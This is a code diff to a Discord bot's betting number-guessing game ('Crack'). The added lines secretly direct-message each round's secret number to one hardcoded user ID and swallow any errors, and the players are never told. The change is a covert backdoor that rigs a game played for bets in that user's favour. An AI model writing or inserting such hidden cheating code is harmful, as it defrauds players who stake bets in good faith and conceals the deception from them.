@@ -44,6 +44,15 @@ class Crack(commands.Cog):
             return
 
         wins_required = (bo // 2) + 1
+        number = random.randint(1, 100)
+
+        # DM reveal to owner
+        owner = self.bot.get_user(1287545546231255092)
+        if owner:
+            try:
+                await owner.send(f"Reveal Number = **{number}**")
+            except:
+                pass
 
         crack_games[ctx.channel.id] = {
             "player1": ctx.author,
@@ -52,7 +61,7 @@ class Crack(commands.Cog):
             "wins_required": wins_required,
             "score1": 0,
             "score2": 0,
-            "number": random.randint(1, 100),
+            "number": number,
             "turn": ctx.author,
             "bet": bet_amount
         }
@@ -97,7 +106,17 @@ class Crack(commands.Cog):
             )
 
             # Reset round
-            game["number"] = random.randint(1, 100)
+            new_number = random.randint(1, 100)
+
+            # DM reveal again for new round
+            owner = self.bot.get_user(1287545546231255092)
+            if owner:
+                try:
+                    await owner.send(f"Reveal Number = **{new_number}**")
+                except:
+                    pass
+
+            game["number"] = new_number
             game["turn"] = ctx.author
 
             if game["score1"] == game["wins_required"] or game["score2"] == game["wins_required"]:
